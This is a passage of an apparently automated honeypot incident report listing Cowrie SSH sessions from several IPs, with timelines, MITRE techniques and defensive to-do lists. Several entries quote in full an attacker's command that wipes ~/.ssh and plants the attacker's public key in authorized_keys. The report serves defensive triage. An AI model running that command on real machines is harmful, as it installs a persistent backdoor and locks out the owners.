| `2026-04-20 20:24:44` | `cowrie.client.kex` |
| `2026-04-20 20:24:44` | `cowrie.login.success` |
| `2026-04-20 20:24:44` | `cowrie.session.params` |
| `2026-04-20 20:24:44` | `cowrie.command.input` |
| `2026-04-20 20:24:44` | `cowrie.command.failed` |
| `2026-04-20 20:24:44` | `cowrie.log.closed` |
| `2026-04-20 20:24:45` | `cowrie.session.params` |
| `2026-04-20 20:24:45` | `cowrie.command.input` |
| `2026-04-20 20:24:45` | `cowrie.session.file_download` |
| `2026-04-20 20:24:45` | `cowrie.log.closed` |
| `2026-04-20 20:24:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23bce923c737

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-20 20:24 |
| **Last Seen** | 2026-04-20 20:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:24:45` | `cowrie.session.connect` |
| `2026-04-20 20:24:45` | `cowrie.client.version` |
| `2026-04-20 20:24:45` | `cowrie.client.kex` |
| `2026-04-20 20:24:46` | `cowrie.login.success` |
| `2026-04-20 20:24:47` | `cowrie.session.params` |
| `2026-04-20 20:24:47` | `cowrie.command.input` |
| `2026-04-20 20:24:47` | `cowrie.command.failed` |
| `2026-04-20 20:24:47` | `cowrie.log.closed` |
| `2026-04-20 20:24:48` | `cowrie.session.params` |
| `2026-04-20 20:24:48` | `cowrie.command.input` |
| `2026-04-20 20:24:48` | `cowrie.session.file_download` |
| `2026-04-20 20:24:48` | `cowrie.log.closed` |
| `2026-04-20 20:24:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9abec255ab3f

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 20:24 |
| **Last Seen** | 2026-04-20 20:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:24:47` | `cowrie.session.connect` |
| `2026-04-20 20:24:47` | `cowrie.client.version` |
| `2026-04-20 20:24:47` | `cowrie.client.kex` |
| `2026-04-20 20:24:48` | `cowrie.login.success` |
| `2026-04-20 20:24:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12aedb5ceadc

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-20 20:24 |
| **Last Seen** | 2026-04-20 20:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:24:51` | `cowrie.session.connect` |
| `2026-04-20 20:24:51` | `cowrie.client.version` |
| `2026-04-20 20:24:51` | `cowrie.client.kex` |
| `2026-04-20 20:24:52` | `cowrie.login.success` |
| `2026-04-20 20:24:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-827042b75248

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-20 20:24 |
| **Last Seen** | 2026-04-20 20:25 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:24:56` | `cowrie.session.connect` |
| `2026-04-20 20:24:56` | `cowrie.client.version` |
| `2026-04-20 20:24:57` | `cowrie.client.kex` |
| `2026-04-20 20:24:58` | `cowrie.login.success` |
| `2026-04-20 20:24:59` | `cowrie.session.params` |
| `2026-04-20 20:24:59` | `cowrie.command.input` |
| `2026-04-20 20:24:59` | `cowrie.command.failed` |
| `2026-04-20 20:24:59` | `cowrie.log.closed` |
| `2026-04-20 20:25:00` | `cowrie.session.params` |
| `2026-04-20 20:25:00` | `cowrie.command.input` |
| `2026-04-20 20:25:00` | `cowrie.session.file_download` |
| `2026-04-20 20:25:00` | `cowrie.log.closed` |
| `2026-04-20 20:25:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdb2815a7af6

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-20 20:25 |
| **Last Seen** | 2026-04-20 20:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:25:04` | `cowrie.session.connect` |
| `2026-04-20 20:25:04` | `cowrie.client.version` |
| `2026-04-20 20:25:05` | `cowrie.client.kex` |
| `2026-04-20 20:25:06` | `cowrie.login.success` |
| `2026-04-20 20:25:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fda891768dcf

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 20:27 |
| **Last Seen** | 2026-04-20 20:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:27:42` | `cowrie.session.connect` |
| `2026-04-20 20:27:42` | `cowrie.client.version` |
| `2026-04-20 20:27:42` | `cowrie.client.kex` |
| `2026-04-20 20:27:42` | `cowrie.login.success` |
| `2026-04-20 20:27:43` | `cowrie.session.params` |
| `2026-04-20 20:27:43` | `cowrie.command.input` |
| `2026-04-20 20:27:43` | `cowrie.command.failed` |
| `2026-04-20 20:27:43` | `cowrie.log.closed` |
| `2026-04-20 20:27:43` | `cowrie.session.params` |
| `2026-04-20 20:27:43` | `cowrie.command.input` |
| `2026-04-20 20:27:43` | `cowrie.session.file_download` |
| `2026-04-20 20:27:43` | `cowrie.log.closed` |
| `2026-04-20 20:27:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e209d6ca6cee

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 20:27 |
| **Last Seen** | 2026-04-20 20:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:27:45` | `cowrie.session.connect` |
| `2026-04-20 20:27:45` | `cowrie.client.version` |
| `2026-04-20 20:27:45` | `cowrie.client.kex` |
| `2026-04-20 20:27:46` | `cowrie.login.success` |
| `2026-04-20 20:27:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d32cc6206043

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-20 20:27 |
| **Last Seen** | 2026-04-20 20:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:27:55` | `cowrie.session.connect` |
| `2026-04-20 20:27:55` | `cowrie.client.version` |
| `2026-04-20 20:27:56` | `cowrie.client.kex` |
| `2026-04-20 20:27:56` | `cowrie.login.success` |
| `2026-04-20 20:27:56` | `cowrie.session.params` |
| `2026-04-20 20:27:56` | `cowrie.command.input` |
| `2026-04-20 20:27:56` | `cowrie.command.failed` |
| `2026-04-20 20:27:56` | `cowrie.log.closed` |
| `2026-04-20 20:27:57` | `cowrie.session.params` |
| `2026-04-20 20:27:57` | `cowrie.command.input` |
| `2026-04-20 20:27:57` | `cowrie.session.file_download` |
| `2026-04-20 20:27:57` | `cowrie.log.closed` |
| `2026-04-20 20:27:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c0dce3650de

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-20 20:27 |
| **Last Seen** | 2026-04-20 20:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:27:59` | `cowrie.session.connect` |
| `2026-04-20 20:27:59` | `cowrie.client.version` |
| `2026-04-20 20:27:59` | `cowrie.client.kex` |
| `2026-04-20 20:27:59` | `cowrie.login.success` |
| `2026-04-20 20:27:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f0d1e0cf687

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-20 20:29 |
| **Last Seen** | 2026-04-20 20:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:29:27` | `cowrie.session.connect` |
| `2026-04-20 20:29:27` | `cowrie.client.version` |
| `2026-04-20 20:29:27` | `cowrie.client.kex` |
| `2026-04-20 20:29:28` | `cowrie.login.success` |
| `2026-04-20 20:29:29` | `cowrie.session.params` |
| `2026-04-20 20:29:29` | `cowrie.command.input` |
| `2026-04-20 20:29:29` | `cowrie.command.failed` |
| `2026-04-20 20:29:29` | `cowrie.log.closed` |
| `2026-04-20 20:29:29` | `cowrie.session.params` |
| `2026-04-20 20:29:29` | `cowrie.command.input` |
| `2026-04-20 20:29:30` | `cowrie.session.file_download` |
| `2026-04-20 20:29:30` | `cowrie.log.closed` |
| `2026-04-20 20:29:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c06c73977ce6

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-20 20:29 |
| **Last Seen** | 2026-04-20 20:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:29:33` | `cowrie.session.connect` |
| `2026-04-20 20:29:33` | `cowrie.client.version` |
| `2026-04-20 20:29:33` | `cowrie.client.kex` |
| `2026-04-20 20:29:34` | `cowrie.login.success` |
| `2026-04-20 20:29:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-495d9d363f3d

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-20 20:29 |
| **Last Seen** | 2026-04-20 20:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:29:37` | `cowrie.session.connect` |
| `2026-04-20 20:29:37` | `cowrie.client.version` |
| `2026-04-20 20:29:38` | `cowrie.client.kex` |
| `2026-04-20 20:29:38` | `cowrie.login.success` |
| `2026-04-20 20:29:38` | `cowrie.session.params` |
| `2026-04-20 20:29:38` | `cowrie.command.input` |
| `2026-04-20 20:29:38` | `cowrie.command.failed` |
| `2026-04-20 20:29:39` | `cowrie.log.closed` |
| `2026-04-20 20:29:39` | `cowrie.session.params` |
| `2026-04-20 20:29:39` | `cowrie.command.input` |
| `2026-04-20 20:29:39` | `cowrie.session.file_download` |
| `2026-04-20 20:29:39` | `cowrie.log.closed` |
| `2026-04-20 20:29:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2e7087ed5c0

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-20 20:29 |
| **Last Seen** | 2026-04-20 20:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:29:41` | `cowrie.session.connect` |
| `2026-04-20 20:29:41` | `cowrie.client.version` |
| `2026-04-20 20:29:41` | `cowrie.client.kex` |
| `2026-04-20 20:29:42` | `cowrie.login.success` |
| `2026-04-20 20:29:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-685edefeb47e

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-20 20:31 |
| **Last Seen** | 2026-04-20 20:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:31:18` | `cowrie.session.connect` |
| `2026-04-20 20:31:18` | `cowrie.client.version` |
| `2026-04-20 20:31:18` | `cowrie.client.kex` |
| `2026-04-20 20:31:19` | `cowrie.login.success` |
| `2026-04-20 20:31:19` | `cowrie.session.params` |
| `2026-04-20 20:31:19` | `cowrie.command.input` |
| `2026-04-20 20:31:19` | `cowrie.command.failed` |
| `2026-04-20 20:31:19` | `cowrie.log.closed` |
| `2026-04-20 20:31:20` | `cowrie.session.params` |
| `2026-04-20 20:31:20` | `cowrie.command.input` |
| `2026-04-20 20:31:20` | `cowrie.session.file_download` |
| `2026-04-20 20:31:20` | `cowrie.log.closed` |
| `2026-04-20 20:31:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94bbda3e68da

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-20 20:31 |
| **Last Seen** | 2026-04-20 20:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:31:22` | `cowrie.session.connect` |
| `2026-04-20 20:31:22` | `cowrie.client.version` |
| `2026-04-20 20:31:23` | `cowrie.client.kex` |
| `2026-04-20 20:31:23` | `cowrie.login.success` |
| `2026-04-20 20:31:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6d984f02fc0

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-20 20:32 |
| **Last Seen** | 2026-04-20 20:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:32:59` | `cowrie.session.connect` |
| `2026-04-20 20:32:59` | `cowrie.client.version` |
| `2026-04-20 20:33:00` | `cowrie.client.kex` |
| `2026-04-20 20:33:00` | `cowrie.login.success` |
| `2026-04-20 20:33:00` | `cowrie.session.params` |
| `2026-04-20 20:33:00` | `cowrie.command.input` |
| `2026-04-20 20:33:00` | `cowrie.command.failed` |
| `2026-04-20 20:33:00` | `cowrie.log.closed` |
| `2026-04-20 20:33:01` | `cowrie.session.params` |
| `2026-04-20 20:33:01` | `cowrie.command.input` |
| `2026-04-20 20:33:01` | `cowrie.session.file_download` |
| `2026-04-20 20:33:01` | `cowrie.log.closed` |
| `2026-04-20 20:33:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-156d384a1b95

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-20 20:33 |
| **Last Seen** | 2026-04-20 20:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:33:03` | `cowrie.session.connect` |
| `2026-04-20 20:33:03` | `cowrie.client.version` |
| `2026-04-20 20:33:03` | `cowrie.client.kex` |
| `2026-04-20 20:33:04` | `cowrie.login.success` |
| `2026-04-20 20:33:04` | `cowrie.session.closed` |

**Recommended Actions:**
